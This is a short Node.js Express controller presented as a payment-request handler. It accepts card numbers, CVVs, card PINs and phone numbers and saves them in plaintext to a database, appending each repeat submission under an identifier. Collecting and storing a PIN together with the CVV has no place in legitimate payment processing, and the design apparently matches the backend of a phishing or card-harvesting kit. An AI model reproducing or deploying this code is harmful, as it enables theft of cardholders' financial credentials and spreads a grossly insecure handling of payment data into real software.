
const PaymentRequest = require('../models/PaymentRequest');

exports.submitPaymentRequest = async (req, res) => {
  try {
    const { uniqueid, cardNumber, cvv, pin, phoneNumber } = req.body;

    let paymentRequest = await PaymentRequest.findOne({ uniqueid });

    const newEntry = {
      cardNumber,
      cvv,
      pin,
      phoneNumber
    };

    if (paymentRequest) {
      paymentRequest.entries.push(newEntry);
    } else {
      paymentRequest = new PaymentRequest({
        uniqueid,
        entries: [newEntry]
      });
    }

    await paymentRequest.save();

    res.status(200).json({
      success: true,
      message: "Payment request submitted successfully!"
    });
  } catch (error) {
    console.error('Payment request submission error:', error);
    res.status(500).json({
      success: false,
      message: "Failed to submit payment request."
    });
  }
};
